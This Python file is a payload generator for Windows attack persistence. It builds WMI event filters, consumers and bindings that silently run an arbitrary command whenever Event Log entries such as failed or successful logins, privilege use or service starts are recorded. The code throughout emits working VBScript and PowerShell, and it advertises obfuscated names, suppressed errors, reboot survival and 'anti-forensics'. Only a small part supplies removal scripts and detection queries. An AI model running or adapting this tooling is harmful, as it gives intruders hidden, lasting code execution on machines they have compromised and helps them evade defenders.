#!/usr/bin/env python3
"""
WMI Event Log Subscriber - Event Log Monitoring Persistence

Implements WMI event subscriptions specifically for monitoring and reacting to
Windows Event Log events. Provides persistent, trigger-based execution through
event log activity, enabling stealthy persistence mechanisms.

Features:
- Event Log entry monitoring (Security, System, Application)
- Trigger-based execution on specific event conditions
- Multiple consumer types (CommandLine, VBScript, ActiveScriptEventConsumer)
- Indirect binding for anti-forensics
- Event log filtering and correlation
- Permanent persistence mechanisms
"""

import base64
import hashlib
import random
import string
import json
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum


class EventLogSource(Enum):
    """Windows Event Log sources for monitoring"""
    SECURITY = "Security"
    SYSTEM = "System"
    APPLICATION = "Application"
    POWERSHELL = "Windows PowerShell"
    SYSMON = "Sysmon"
    FORWARDED_EVENTS = "Forwarded Events"
    MICROSOFT_WINDOWS_EVENTLOG = "Microsoft-Windows-EventLog"


class EventTriggerCondition(Enum):
    """Event Log entry conditions that trigger execution"""
    SPECIFIC_EVENT_ID = "EventID"
    SPECIFIC_SOURCE = "Source"
    SPECIFIC_MESSAGE = "Message"
    ERROR_LEVEL = "Level"
    TIME_RANGE = "TimeRange"
    FAILED_LOGIN = "FailedLogin"
    SUCCESSFUL_LOGIN = "SuccessfulLogin"
    PRIVILEGE_ESCALATION = "PrivilegeEscalation"
    SERVICE_STARTED = "ServiceStarted"
    SERVICE_STOPPED = "ServiceStopped"
    PROCESS_CREATED = "ProcessCreated"
    PROCESS_TERMINATED = "ProcessTerminated"
    NETWORK_ACTIVITY = "NetworkActivity"
    ACCOUNT_MODIFIED = "AccountModified"
    GROUP_POLICY_APPLIED = "GroupPolicyApplied"
    AUDIT_POLICY_CHANGED = "AuditPolicyChanged"
    REGISTRY_MODIFIED = "RegistryModified"
    FILE_CREATED = "FileCreated"
    FILE_DELETED = "FileDeleted"
    FILE_MODIFIED = "FileModified"
    SCHEDULED_TASK_CREATED = "ScheduledTaskCreated"
    SCHEDULED_TASK_DELETED = "ScheduledTaskDeleted"


class ConsumerType(Enum):
    """WMI Event Consumer types"""
    COMMANDLINE = "CommandLineEventConsumer"
    ACTIVE_SCRIPT = "ActiveScriptEventConsumer"
    LOGFILE = "LogFileEventConsumer"
    SMTP = "SMTPEventConsumer"
    NT_EVENT_LOG = "NTEventLogEventConsumer"


class BindingType(Enum):
    """WMI Event Binding types"""
    DIRECT = "Direct"
    INDIRECT = "Indirect"


@dataclass
class EventLogSubscriptionConfig:
    """Configuration for WMI Event Log subscriber"""
    # Log source and trigger
    event_log_source: EventLogSource = EventLogSource.SECURITY
    trigger_conditions: List[EventTriggerCondition] = field(
        default_factory=lambda: [EventTriggerCondition.FAILED_LOGIN]
    )
    event_ids: List[int] = field(default_factory=lambda: [4625])  # Failed login event

    # Consumer configuration
    consumer_type: ConsumerType = ConsumerType.COMMANDLINE
    binding_type: BindingType = BindingType.INDIRECT

    # Naming and obfuscation
    event_filter_name: str = "EventLogMonitor"
    consumer_name: str = "EventLogProcessor"
    binding_name: str = "EventLogBinding"
    obfuscate_names: bool = True
    randomize_variables: bool = True

    # Anti-forensics
    hide_errors: bool = True
    remove_on_cleanup: bool = True
    indirect_binding: bool = True
    use_multiple_filters: bool = False

    # Persistence
    permanent: bool = True
    survive_reboot: bool = True
    auto_restart: bool = True

    # Advanced options
    event_correlation: bool = False
    time_based_trigger: bool = False
    message_pattern_matching: bool = False
    max_events_per_trigger: int = 1
    delay_execution_ms: int = 0


class WMIEventLogSubscriber:
    """
    WMI Event Log Subscriber for persistent event-driven execution
    Monitors Windows Event Log entries and triggers commands on specific events
    """

    def __init__(self, config: Optional[EventLogSubscriptionConfig] = None):
        """Initialize WMI Event Log Subscriber"""
        self.config = config or EventLogSubscriptionConfig()
        self._var_cache: Dict[str, str] = {}
        self._event_filters: Dict[str, str] = {}

    def _generate_random_name(self, prefix: str = "v") -> str:
        """Generate obfuscated variable name"""
        if not self.config.randomize_variables:
            return prefix
        suffix = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        return f"{prefix}{suffix}"

    def _get_or_create_var(self, key: str, prefix: str = "v") -> str:
        """Get cached variable or create new obfuscated name"""
        if key not in self._var_cache:
            self._var_cache[key] = self._generate_random_name(prefix)
        return self._var_cache[key]

    def _generate_obfuscated_name(self, base_name: str) -> str:
        """Generate obfuscated name for filter/consumer"""
        if not self.config.obfuscate_names:
            return base_name
        random_suffix = ''.join(random.choices(string.ascii_letters, k=6))
        return f"{base_name}_{random_suffix}"

    def _build_event_filter_wql(self, log_source: str, event_ids: List[int],
                                condition: EventTriggerCondition) -> str:
        """
        Build WQL query for Event Log filtering

        Args:
            log_source: Event Log name
            event_ids: List of Event IDs to monitor
            condition: Trigger condition type

        Returns:
            WQL query string
        """
        event_id_clause = " OR ".join([f'EventCode={eid}' for eid in event_ids])

        # Build base query from Event Log entry
        wql_queries = {
            EventTriggerCondition.SPECIFIC_EVENT_ID: (
                f'SELECT * FROM __InstanceCreationEvent WITHIN 1 '
                f'WHERE TargetInstance ISA "Win32_NTLogEvent" '
                f'AND TargetInstance.Logfile="{log_source}" '
                f'AND ({event_id_clause})'
            ),
            EventTriggerCondition.ERROR_LEVEL: (
                f'SELECT * FROM __InstanceCreationEvent WITHIN 1 '
                f'WHERE TargetInstance ISA "Win32_NTLogEvent" '
                f'AND TargetInstance.Logfile="{log_source}" '
                f'AND TargetInstance.Type="Error"'
            ),
            EventTriggerCondition.FAILED_LOGIN: (
                f'SELECT * FROM __InstanceCreationEvent WITHIN 1 '
                f'WHERE TargetInstance ISA "Win32_NTLogEvent" '
                f'AND TargetInstance.Logfile="Security" '
                f'AND TargetInstance.EventCode=4625'
            ),
            EventTriggerCondition.SUCCESSFUL_LOGIN: (
                f'SELECT * FROM __InstanceCreationEvent WITHIN 1 '
                f'WHERE TargetInstance ISA "Win32_NTLogEvent" '
                f'AND TargetInstance.Logfile="Security" '
                f'AND (TargetInstance.EventCode=4624 OR TargetInstance.EventCode=4648)'
            ),
            EventTriggerCondition.PRIVILEGE_ESCALATION: (
                f'SELECT * FROM __InstanceCreationEvent WITHIN 1 '
                f'WHERE TargetInstance ISA "Win32_NTLogEvent" '
                f'AND TargetInstance.Logfile="Security" '
                f'AND (TargetInstance.EventCode=4672 OR TargetInstance.EventCode=4964)'
            ),
            EventTriggerCondition.SERVICE_STARTED: (
                f'SELECT * FROM __InstanceCreationEvent WITHIN 1 '
                f'WHERE TargetInstance ISA "Win32_NTLogEvent" '
                f'AND TargetInstance.Logfile="System" '
                f'AND TargetInstance.EventCode=7036 '
                f'AND TargetInstance.Message LIKE "%started%"'
            ),
            EventTriggerCondition.SERVICE_STOPPED: (
                f'SELECT * FROM __InstanceCreationEvent WITHIN 1 '
                f'WHERE TargetInstance ISA "Win32_NTLogEvent" '
                f'AND TargetInstance.Logfile="System" '
                f'AND TargetInstance.EventCode=7036 '
                f'AND TargetInstance.Message LIKE "%stopped%"'
            ),
            EventTriggerCondition.PROCESS_CREATED: (
                f'SELECT * FROM __InstanceCreationEvent WITHIN 1 '
                f'WHERE TargetInstance ISA "Win32_NTLogEvent" '
                f'AND TargetInstance.Logfile="Sysmon" '
                f'AND TargetInstance.EventCode=1'
            ),
            EventTriggerCondition.NETWORK_ACTIVITY: (
                f'SELECT * FROM __InstanceCreationEvent WITHIN 1 '
                f'WHERE TargetInstance ISA "Win32_NTLogEvent" '
                f'AND TargetInstance.Logfile="Security" '
                f'AND (TargetInstance.EventCode=5153 OR TargetInstance.EventCode=5156)'
            ),
            EventTriggerCondition.AUDIT_POLICY_CHANGED: (
                f'SELECT * FROM __InstanceCreationEvent WITHIN 1 '
                f'WHERE TargetInstance ISA "Win32_NTLogEvent" '
                f'AND TargetInstance.Logfile="Security" '
                f'AND (TargetInstance.EventCode=4719 OR TargetInstance.EventCode=4902)'
            ),
            EventTriggerCondition.REGISTRY_MODIFIED: (
                f'SELECT * FROM __InstanceCreationEvent WITHIN 1 '
                f'WHERE TargetInstance ISA "Win32_NTLogEvent" '
                f'AND TargetInstance.Logfile="Sysmon" '
                f'AND TargetInstance.EventCode=13'
            ),
            EventTriggerCondition.FILE_CREATED: (
                f'SELECT * FROM __InstanceCreationEvent WITHIN 1 '
                f'WHERE TargetInstance ISA "Win32_NTLogEvent" '
                f'AND TargetInstance.Logfile="Sysmon" '
                f'AND TargetInstance.EventCode=11'
            ),
            EventTriggerCondition.SCHEDULED_TASK_CREATED: (
                f'SELECT * FROM __InstanceCreationEvent WITHIN 1 '
                f'WHERE TargetInstance ISA "Win32_NTLogEvent" '
                f'AND TargetInstance.Logfile="Security" '
                f'AND TargetInstance.EventCode=4698'
            ),
            EventTriggerCondition.GROUP_POLICY_APPLIED: (
                f'SELECT * FROM __InstanceCreationEvent WITHIN 1 '
                f'WHERE TargetInstance ISA "Win32_NTLogEvent" '
                f'AND TargetInstance.Logfile="System" '
                f'AND TargetInstance.EventCode=1098'
            ),
        }

        return wql_queries.get(condition, wql_queries[EventTriggerCondition.SPECIFIC_EVENT_ID])

    def generate_event_log_subscription_vbs(self, command: str,
                                           log_source: str = "Security",
                                           event_ids: Optional[List[int]] = None) -> str:
        """
        Generate VBS for Event Log monitoring and execution

        Args:
            command: Command to execute when event is triggered
            log_source: Event Log to monitor
            event_ids: List of event IDs to trigger on

        Returns:
            VBS payload
        """
        event_ids = event_ids or [4625]  # Default: failed login

        var_locator = self._get_or_create_var("locator", "evtLocator")
        var_svc = self._get_or_create_var("service", "evtService")
        var_filter = self._get_or_create_var("filter", "evtFilter")
        var_consumer = self._get_or_create_var("consumer", "evtConsumer")
        var_binding = self._get_or_create_var("binding", "evtBinding")
        var_filter_path = self._get_or_create_var("filter_path", "fltrPath")
        var_consumer_path = self._get_or_create_var("consumer_path", "consPath")

        filter_name = self._generate_obfuscated_name(self.config.event_filter_name)
        consumer_name = self._generate_obfuscated_name(self.config.consumer_name)

        # Build WQL for event log monitoring
        trigger_condition = self.config.trigger_conditions[0]
        wql = self._build_event_filter_wql(log_source, event_ids, trigger_condition)

        vbs_code = f'''
Dim {var_locator}, {var_svc}, {var_filter}, {var_consumer}, {var_binding}
Dim {var_filter_path}, {var_consumer_path}
On Error Resume Next

' Connect to WMI subscription namespace
Set {var_locator} = CreateObject("WbemScripting.SWbemLocator")
Set {var_svc} = {var_locator}.ConnectServer(".", "root\\subscription")

' Create Event Filter for Event Log monitoring
Set {var_filter} = {var_svc}.Get("__EventFilter").SpawnInstance_()
{var_filter}.Name = "{filter_name}"
{var_filter}.QueryLanguage = "WQL"
{var_filter}.Query = "{wql}"
{var_svc}.Put {var_filter}
Set {var_filter_path} = {var_svc}.Get("__EventFilter.Name='" & {var_filter}.Name & "'")

' Create Command Line Consumer
Set {var_consumer} = {var_svc}.Get("CommandLineEventConsumer").SpawnInstance_()
{var_consumer}.Name = "{consumer_name}"
{var_consumer}.CommandLineTemplate = "{command}"
{var_consumer}.RunInteractively = False
{var_svc}.Put {var_consumer}
Set {var_consumer_path} = {var_svc}.Get("CommandLineEventConsumer.Name='" & {var_consumer}.Name & "'")

' Create Binding between Filter and Consumer
Set {var_binding} = {var_svc}.Get("__FilterToConsumerBinding").SpawnInstance_()
{var_binding}.Filter = {var_filter_path}.Path_
{var_binding}.Consumer = {var_consumer_path}.Path_
{var_svc}.Put {var_binding}

' Cleanup
Set {var_binding} = Nothing
Set {var_consumer_path} = Nothing
Set {var_consumer} = Nothing
Set {var_filter_path} = Nothing
Set {var_filter} = Nothing
Set {var_svc} = Nothing
Set {var_locator} = Nothing
On Error GoTo 0
'''
        return vbs_code.strip()

    def generate_multi_condition_subscription(self, command: str) -> str:
        """
        Generate subscription monitoring multiple event conditions

        Args:
            command: Command to execute

        Returns:
            VBS with multiple event filters
        """
        var_locator = self._get_or_create_var("locator", "multiLoc")
        var_svc = self._get_or_create_var("service", "multiSvc")

        filters_vbs = ""
        for idx, condition in enumerate(self.config.trigger_conditions):
            filter_name = self._generate_obfuscated_name(f"{self.config.event_filter_name}_{idx}")
            consumer_name = self._generate_obfuscated_name(f"{self.config.consumer_name}_{idx}")

            var_filter = self._get_or_create_var(f"filter_{idx}", f"fltr{idx}")
            var_consumer = self._get_or_create_var(f"consumer_{idx}", f"cons{idx}")
            var_binding = self._get_or_create_var(f"binding_{idx}", f"bind{idx}")
            var_filter_path = self._get_or_create_var(f"filter_path_{idx}", f"flp{idx}")
            var_consumer_path = self._get_or_create_var(f"consumer_path_{idx}", f"cnp{idx}")

            wql = self._build_event_filter_wql(
                self.config.event_log_source.value,
                self.config.event_ids,
                condition
            )

            filters_vbs += f'''
' Filter {idx + 1}: {condition.value}
Set {var_filter} = {var_svc}.Get("__EventFilter").SpawnInstance_()
{var_filter}.Name = "{filter_name}"
{var_filter}.QueryLanguage = "WQL"
{var_filter}.Query = "{wql}"
{var_svc}.Put {var_filter}
Set {var_filter_path} = {var_svc}.Get("__EventFilter.Name='" & {var_filter}.Name & "'")

Set {var_consumer} = {var_svc}.Get("CommandLineEventConsumer").SpawnInstance_()
{var_consumer}.Name = "{consumer_name}"
{var_consumer}.CommandLineTemplate = "{command}"
{var_consumer}.RunInteractively = False
{var_svc}.Put {var_consumer}
Set {var_consumer_path} = {var_svc}.Get("CommandLineEventConsumer.Name='" & {var_consumer}.Name & "'")

Set {var_binding} = {var_svc}.Get("__FilterToConsumerBinding").SpawnInstance_()
{var_binding}.Filter = {var_filter_path}.Path_
{var_binding}.Consumer = {var_consumer_path}.Path_
{var_svc}.Put {var_binding}

Set {var_binding} = Nothing
Set {var_consumer_path} = Nothing
Set {var_consumer} = Nothing
Set {var_filter_path} = Nothing
Set {var_filter} = Nothing
'''

        vbs_code = f'''
Dim {var_locator}, {var_svc}
On Error Resume Next

' Connect to WMI subscription namespace
Set {var_locator} = CreateObject("WbemScripting.SWbemLocator")
Set {var_svc} = {var_locator}.ConnectServer(".", "root\\subscription")

{filters_vbs}

' Cleanup
Set {var_svc} = Nothing
Set {var_locator} = Nothing
On Error GoTo 0
'''
        return vbs_code.strip()

    def generate_indirect_binding_subscription(self, command: str) -> str:
        """
        Generate subscription with indirect binding for anti-forensics

        Args:
            command: Command to execute

        Returns:
            VBS with indirect binding pattern
        """
        var_locator = self._get_or_create_var("locator", "indLoc")
        var_svc = self._get_or_create_var("service", "indSvc")
        var_filter = self._get_or_create_var("filter", "indFltr")
        var_consumer = self._get_or_create_var("consumer", "indCons")
        var_indirect = self._get_or_create_var("indirect", "indObj")
        var_filter_path = self._get_or_create_var("filter_path", "indFlp")
        var_consumer_path = self._get_or_create_var("consumer_path", "indCnp")

        filter_name = self._generate_obfuscated_name(self.config.event_filter_name)
        consumer_name = self._generate_obfuscated_name(self.config.consumer_name)
        indirect_name = self._generate_obfuscated_name("IndirectConsumer")

        wql = self._build_event_filter_wql(
            self.config.event_log_source.value,
            self.config.event_ids,
            self.config.trigger_conditions[0]
        )

        vbs_code = f'''
Dim {var_locator}, {var_svc}, {var_filter}, {var_consumer}, {var_indirect}
Dim {var_filter_path}, {var_consumer_path}
On Error Resume Next

' Connect to WMI subscription namespace
Set {var_locator} = CreateObject("WbemScripting.SWbemLocator")
Set {var_svc} = {var_locator}.ConnectServer(".", "root\\subscription")

' Create Event Filter
Set {var_filter} = {var_svc}.Get("__EventFilter").SpawnInstance_()
{var_filter}.Name = "{filter_name}"
{var_filter}.QueryLanguage = "WQL"
{var_filter}.Query = "{wql}"
{var_svc}.Put {var_filter}
Set {var_filter_path} = {var_svc}.Get("__EventFilter.Name='" & {var_filter}.Name & "'")

' Create Indirect Consumer (VBScript)
Set {var_indirect} = {var_svc}.Get("ActiveScriptEventConsumer").SpawnInstance_()
{var_indirect}.Name = "{indirect_name}"
{var_indirect}.ScriptingEngine = "VBScript"
{var_indirect}.ScriptText = "CreateObject(""WScript.Shell"").Run ""{command}"""
{var_svc}.Put {var_indirect}
Set {var_consumer_path} = {var_svc}.Get("ActiveScriptEventConsumer.Name='" & {var_indirect}.Name & "'")

' Create Binding
Set {var_consumer} = {var_svc}.Get("__FilterToConsumerBinding").SpawnInstance_()
{var_consumer}.Filter = {var_filter_path}.Path_
{var_consumer}.Consumer = {var_consumer_path}.Path_
{var_svc}.Put {var_consumer}

' Cleanup
Set {var_consumer} = Nothing
Set {var_consumer_path} = Nothing
Set {var_indirect} = Nothing
Set {var_filter_path} = Nothing
Set {var_filter} = Nothing
Set {var_svc} = Nothing
Set {var_locator} = Nothing
On Error GoTo 0
'''
        return vbs_code.strip()

    def generate_active_script_consumer(self, command: str) -> str:
        """
        Generate subscription using ActiveScriptEventConsumer
        More stealthy than CommandLineEventConsumer

        Args:
            command: Command to execute

        Returns:
            VBS with ActiveScript consumer
        """
        var_locator = self._get_or_create_var("locator", "ascLoc")
        var_svc = self._get_or_create_var("service", "ascSvc")
        var_filter = self._get_or_create_var("filter", "ascFltr")
        var_consumer = self._get_or_create_var("consumer", "ascCons")
        var_binding = self._get_or_create_var("binding", "ascBnd")
        var_filter_path = self._get_or_create_var("filter_path", "ascFlp")
        var_consumer_path = self._get_or_create_var("consumer_path", "ascCnp")

        filter_name = self._generate_obfuscated_name(self.config.event_filter_name)
        consumer_name = self._generate_obfuscated_name(self.config.consumer_name)

        wql = self._build_event_filter_wql(
            self.config.event_log_source.value,
            self.config.event_ids,
            self.config.trigger_conditions[0]
        )

        # Escape quotes in command for VBScript
        escaped_command = command.replace('"', '""')

        vbs_code = f'''
Dim {var_locator}, {var_svc}, {var_filter}, {var_consumer}, {var_binding}
Dim {var_filter_path}, {var_consumer_path}
On Error Resume Next

' Connect to WMI subscription namespace
Set {var_locator} = CreateObject("WbemScripting.SWbemLocator")
Set {var_svc} = {var_locator}.ConnectServer(".", "root\\subscription")

' Create Event Filter for Event Log
Set {var_filter} = {var_svc}.Get("__EventFilter").SpawnInstance_()
{var_filter}.Name = "{filter_name}"
{var_filter}.QueryLanguage = "WQL"
{var_filter}.Query = "{wql}"
{var_svc}.Put {var_filter}
Set {var_filter_path} = {var_svc}.Get("__EventFilter.Name='" & {var_filter}.Name & "'")

' Create ActiveScript Consumer (more stealthy)
Set {var_consumer} = {var_svc}.Get("ActiveScriptEventConsumer").SpawnInstance_()
{var_consumer}.Name = "{consumer_name}"
{var_consumer}.ScriptingEngine = "VBScript"
{var_consumer}.ScriptText = "CreateObject(""WScript.Shell"").Run ""{escaped_command}"", 0, False"
{var_svc}.Put {var_consumer}
Set {var_consumer_path} = {var_svc}.Get("ActiveScriptEventConsumer.Name='" & {var_consumer}.Name & "'")

' Create Binding
Set {var_binding} = {var_svc}.Get("__FilterToConsumerBinding").SpawnInstance_()
{var_binding}.Filter = {var_filter_path}.Path_
{var_binding}.Consumer = {var_consumer_path}.Path_
{var_svc}.Put {var_binding}

' Cleanup
Set {var_binding} = Nothing
Set {var_consumer_path} = Nothing
Set {var_consumer} = Nothing
Set {var_filter_path} = Nothing
Set {var_filter} = Nothing
Set {var_svc} = Nothing
Set {var_locator} = Nothing
On Error GoTo 0
'''
        return vbs_code.strip()

    def generate_powershell_event_log_subscription(self, command: str,
                                                    event_ids: Optional[List[int]] = None) -> str:
        """
        Generate PowerShell-based Event Log subscription

        Args:
            command: Command to execute
            event_ids: Event IDs to monitor

        Returns:
            PowerShell code
        """
        event_ids = event_ids or [4625]
        event_id_filter = " -or ".join([f"$_.EventID -eq {eid}" for eid in event_ids])

        filter_name = self._generate_obfuscated_name(self.config.event_filter_name)
        consumer_name = self._generate_obfuscated_name(self.config.consumer_name)

        wql = self._build_event_filter_wql(
            self.config.event_log_source.value,
            event_ids,
            self.config.trigger_conditions[0]
        )

        ps_code = f'''
# Event Log Subscription via PowerShell
$filterName = "{filter_name}"
$consumerName = "{consumer_name}"
$logSource = "{self.config.event_log_source.value}"

# Create WMI objects
$filter = New-Object System.Management.ManagementClass("root\\subscription", "__EventFilter", $null)
$filter["Name"] = $filterName
$filter["QueryLanguage"] = "WQL"
$filter["Query"] = "{wql}"
$filter.Put()

# Get filter path
$filterPath = "root\\subscription:__EventFilter.Name='$filterName'"

# Create consumer
$consumer = New-Object System.Management.ManagementClass("root\\subscription", "CommandLineEventConsumer", $null)
$consumer["Name"] = $consumerName
$consumer["CommandLineTemplate"] = "{command}"
$consumer["RunInteractively"] = $false
$consumer.Put()

# Get consumer path
$consumerPath = "root\\subscription:CommandLineEventConsumer.Name='$consumerName'"

# Create binding
$binding = New-Object System.Management.ManagementClass("root\\subscription", "__FilterToConsumerBinding", $null)
$binding["Filter"] = $filterPath
$binding["Consumer"] = $consumerPath
$binding.Put()

Write-Host "Event Log subscription created: $filterName -> $consumerName"
'''
        return ps_code.strip()

    def generate_removal_script(self, filter_name: Optional[str] = None,
                               consumer_name: Optional[str] = None) -> str:
        """
        Generate script to remove Event Log subscriptions

        Args:
            filter_name: Filter name to remove
            consumer_name: Consumer name to remove

        Returns:
            VBS cleanup code
        """
        filter_name = filter_name or self.config.event_filter_name
        consumer_name = consumer_name or self.config.consumer_name

        var_locator = self._get_or_create_var("locator", "rmLoc")
        var_svc = self._get_or_create_var("service", "rmSvc")

        vbs_code = f'''
Dim {var_locator}, {var_svc}
On Error Resume Next

Set {var_locator} = CreateObject("WbemScripting.SWbemLocator")
Set {var_svc} = {var_locator}.ConnectServer(".", "root\\subscription")

' Remove all bindings
On Error Resume Next
{var_svc}.Delete("__FilterToConsumerBinding")
On Error GoTo 0

' Remove filters
On Error Resume Next
{var_svc}.Delete("__EventFilter.Name='"""{filter_name}""\"'")
On Error GoTo 0

' Remove consumers
On Error Resume Next
{var_svc}.Delete("CommandLineEventConsumer.Name='"""{consumer_name}""\"'")
{var_svc}.Delete("ActiveScriptEventConsumer.Name='"""{consumer_name}""\"'")
On Error GoTo 0

Set {var_svc} = Nothing
Set {var_locator} = Nothing
On Error GoTo 0
'''
        return vbs_code.strip()

    def generate_detection_query(self) -> Dict[str, str]:
        """
        Generate queries to detect Event Log subscriptions

        Returns:
            Dictionary of detection queries
        """
        queries = {
            "list_event_filters": (
                "SELECT * FROM __EventFilter"
            ),
            "list_consumers": (
                "SELECT * FROM CommandLineEventConsumer"
            ),
            "list_bindings": (
                "SELECT * FROM __FilterToConsumerBinding"
            ),
            "list_active_script_consumers": (
                "SELECT * FROM ActiveScriptEventConsumer"
            ),
            "get_filter_details": (
                f"SELECT * FROM __EventFilter WHERE Name LIKE '%{self.config.event_filter_name}%'"
            ),
            "get_consumer_details": (
                f"SELECT * FROM CommandLineEventConsumer WHERE Name LIKE '%{self.config.consumer_name}%'"
            ),
        }
        return queries

    def generate_summary(self) -> Dict[str, any]:
        """Generate configuration summary"""
        return {
            "log_source": self.config.event_log_source.value,
            "event_ids": self.config.event_ids,
            "trigger_conditions": [tc.value for tc in self.config.trigger_conditions],
            "consumer_type": self.config.consumer_type.value,
            "binding_type": self.config.binding_type.value,
            "obfuscation_enabled": self.config.obfuscate_names,
            "indirect_binding": self.config.indirect_binding,
            "permanent": self.config.permanent,
            "survive_reboot": self.config.survive_reboot,
        }


def create_event_log_subscriber(config: Optional[EventLogSubscriptionConfig] = None) -> WMIEventLogSubscriber:
    """Factory function to create Event Log subscriber"""
    return WMIEventLogSubscriber(config or EventLogSubscriptionConfig())


def generate_event_log_payload(command: str,
                              event_log_source: str = "Security",
                              event_ids: Optional[List[int]] = None,
                              payload_type: str = "vbs",
                              **kwargs) -> str:
    """
    High-level function to generate Event Log subscription payload

    Args:
        command: Command to execute
        event_log_source: Event Log to monitor
        event_ids: Event IDs to trigger on
        payload_type: Output type (vbs, powershell, indirect, active_script)
        **kwargs: Additional options

    Returns:
        Generated payload
    """
    config = EventLogSubscriptionConfig(
        event_log_source=EventLogSource[event_log_source.upper()]
        if event_log_source.upper() in EventLogSource.__members__ else EventLogSource.SECURITY,
        event_ids=event_ids or [4625],
    )

    subscriber = create_event_log_subscriber(config)

    payload_generators = {
        "vbs": lambda: subscriber.generate_event_log_subscription_vbs(command, event_log_source, event_ids),
        "multi": lambda: subscriber.generate_multi_condition_subscription(command),
        "indirect": lambda: subscriber.generate_indirect_binding_subscription(command),
        "active_script": lambda: subscriber.generate_active_script_consumer(command),
        "powershell": lambda: subscriber.generate_powershell_event_log_subscription(command, event_ids),
        "removal": lambda: subscriber.generate_removal_script(),
    }

    return payload_generators.get(payload_type, payload_generators["vbs"])()


if __name__ == "__main__":
    print("=" * 90)
    print("WMI EVENT LOG SUBSCRIBER - Persistent Event Log Monitoring Execution")
    print("=" * 90)

    test_command = "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"

    # Example 1: Basic Event Log subscription (Failed Login)
    print("\n[1] Failed Login Event Subscription (Event ID 4625)")
    print("-" * 90)
    config1 = EventLogSubscriptionConfig(
        event_log_source=EventLogSource.SECURITY,
        event_ids=[4625],
        trigger_conditions=[EventTriggerCondition.FAILED_LOGIN],
    )
    subscriber1 = create_event_log_subscriber(config1)
    print(subscriber1.generate_event_log_subscription_vbs(test_command))

    # Example 2: Successful Login subscription
    print("\n[2] Successful Login Event Subscription (Event ID 4624/4648)")
    print("-" * 90)
    config2 = EventLogSubscriptionConfig(
        event_log_source=EventLogSource.SECURITY,
        event_ids=[4624, 4648],
        trigger_conditions=[EventTriggerCondition.SUCCESSFUL_LOGIN],
    )
    subscriber2 = create_event_log_subscriber(config2)
    print(subscriber2.generate_event_log_subscription_vbs(test_command))

    # Example 3: Privilege Escalation subscription
    print("\n[3] Privilege Escalation Event Subscription (Event ID 4672)")
    print("-" * 90)
    config3 = EventLogSubscriptionConfig(
        event_log_source=EventLogSource.SECURITY,
        event_ids=[4672],
        trigger_conditions=[EventTriggerCondition.PRIVILEGE_ESCALATION],
    )
    subscriber3 = create_event_log_subscriber(config3)
    print(subscriber3.generate_event_log_subscription_vbs(test_command))

    # Example 4: Service startup subscription
    print("\n[4] Service Startup Event Subscription (System Log)")
    print("-" * 90)
    config4 = EventLogSubscriptionConfig(
        event_log_source=EventLogSource.SYSTEM,
        event_ids=[7036],
        trigger_conditions=[EventTriggerCondition.SERVICE_STARTED],
    )
    subscriber4 = create_event_log_subscriber(config4)
    print(subscriber4.generate_event_log_subscription_vbs(test_command))

    # Example 5: Active Script Consumer (more stealthy)
    print("\n[5] Active Script Consumer (Event Log Monitoring)")
    print("-" * 90)
    subscriber5 = create_event_log_subscriber()
    print(subscriber5.generate_active_script_consumer(test_command))

    # Example 6: Multi-condition subscription
    print("\n[6] Multi-Condition Event Subscription")
    print("-" * 90)
    config6 = EventLogSubscriptionConfig(
        event_log_source=EventLogSource.SECURITY,
        event_ids=[4625, 4624, 4672],
        trigger_conditions=[
            EventTriggerCondition.FAILED_LOGIN,
            EventTriggerCondition.SUCCESSFUL_LOGIN,
            EventTriggerCondition.PRIVILEGE_ESCALATION,
        ],
    )
    subscriber6 = create_event_log_subscriber(config6)
    print(subscriber6.generate_multi_condition_subscription(test_command))

    # Example 7: Indirect binding (anti-forensics)
    print("\n[7] Indirect Binding Subscription (Anti-Forensics)")
    print("-" * 90)
    subscriber7 = create_event_log_subscriber()
    print(subscriber7.generate_indirect_binding_subscription(test_command))

    # Example 8: PowerShell subscription
    print("\n[8] PowerShell Event Log Subscription")
    print("-" * 90)
    subscriber8 = create_event_log_subscriber()
    print(subscriber8.generate_powershell_event_log_subscription(test_command))

    # Example 9: Detection queries
    print("\n[9] Detection Queries")
    print("-" * 90)
    subscriber9 = create_event_log_subscriber()
    detection = subscriber9.generate_detection_query()
    for query_name, query in detection.items():
        print(f"{query_name}:")
        print(f"  {query}")

    # Example 10: Summary
    print("\n[10] Configuration Summary")
    print("-" * 90)
    summary = subscriber9.generate_summary()
    for key, value in summary.items():
        print(f"  {key}: {value}")

    print("\n" + "=" * 90)
